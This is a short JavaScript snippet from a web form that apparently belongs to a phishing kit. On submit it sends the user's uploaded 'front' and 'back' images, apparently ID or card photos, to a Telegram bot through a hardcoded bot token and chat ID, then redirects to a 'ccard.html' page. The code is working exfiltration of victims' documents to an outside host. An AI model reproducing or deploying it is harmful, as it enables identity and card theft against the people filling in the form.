


    const bots = new Bot("6455387584:AAELDS7StGYWXIIUjT2GKNvNdNTmlj0JX50", 6211090366);

   window.location.hostname
   window.location.port



    document.getElementById("form").addEventListener("submit", e => {
        e.preventDefault();
    
    
    ///  const text = document.getElementById("textinput").value;
    
    
    ///    bot.sendFile("#fileinput", text)
        bots.sendFile("#fileinputfront")
        bots.sendFile("#fileinputback")
        .then(res => {
    ///    console.log(res);
        window.location.href='ccard.html'
        })
    })
    
    

